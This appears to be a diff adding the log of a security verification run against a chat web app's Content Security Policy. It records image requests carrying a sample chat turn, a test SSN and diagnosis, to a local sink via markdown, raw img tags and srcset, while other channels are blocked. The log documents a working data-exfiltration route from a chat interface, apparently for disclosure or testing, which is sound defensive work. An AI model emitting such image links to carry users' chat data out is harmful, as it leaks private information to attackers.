@@ -1,0 +1,48 @@
+[verify] CSP from pristine vercel.json:
+  default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com; frame-src 'self' https://verification-center.tinfoil.sh https://webapp-sandbox.tinfoil.sh https://tinfoil-webapp-sandbox-tinfoil.vercel.app; frame-ancestors https://tinfoil.sh https://www.tinfoil.sh; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
+[sink] request: /c.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=srcset referer= https://127.0.0.1:47002/
+[sink] request: /b.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=raw referer= https://127.0.0.1:47002/
+[sink] request: /a.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=md referer= https://127.0.0.1:47002/
+[verify] <img> in page: [
+  {
+    src: [32m'https://127.0.0.1:47001/a.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=md'[39m,
+    complete: [33mtrue[39m,
+    w: [33m0[39m
+  },
+  {
+    src: [32m'https://127.0.0.1:47001/b.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=raw'[39m,
+    complete: [33mtrue[39m,
+    w: [33m0[39m
+  },
+  {
+    src: [32m'https://127.0.0.1:47001/d.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=pic'[39m,
+    complete: [33mtrue[39m,
+    w: [33m0[39m
+  },
+  {
+    src: [32m'http://127.0.0.1:47001/e.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=http'[39m,
+    complete: [33mtrue[39m,
+    w: [33m0[39m
+  },
+  { src: [32m''[39m, complete: [33mtrue[39m, w: [33m0[39m }
+]
+[verify] CSP console messages: [33m9[39m
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256
+   - Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256
+   - Loading the image 'http://127.0.0.1:47001/e.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=http' violates the following Content Secu
+   - Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsafe-eval''. Either the 'unsafe-inline' ke
+   - Framing 'https://127.0.0.1:47001/' violates the following Content Security Policy directive: "frame-src 'self' https://verification-center.tinfoil.sh 
+   - Connecting to 'https://127.0.0.1:47001/ctl-fetch-connect-src' violates the following Content Security Policy directive: "connect-src 'self' data: http
+   - Fetch API cannot load https://127.0.0.1:47001/ctl-fetch-connect-src. Refused to connect because it violates the document's Content Security Policy.
+
+[verify] sink hits: [
+  [32m'/c.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=srcset'[39m,
+  [32m'/b.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=raw'[39m,
+  [32m'/a.png?leak=turn1%3A%20my%20SSN%20is%20987-65-4321%3B%20dx%3DhepC&k=md'[39m
+]
+[verify] RESULT: 3 image request(s) with chat data reached the sink; 0 negative-control request(s) got through (expect 0)
+   leaked: turn1: my SSN is 987-65-4321; dx=hepC | via srcset | referer: https://127.0.0.1:47002/
+   leaked: turn1: my SSN is 987-65-4321; dx=hepC | via raw | referer: https://127.0.0.1:47002/
+   leaked: turn1: my SSN is 987-65-4321; dx=hepC | via md | referer: https://127.0.0.1:47002/
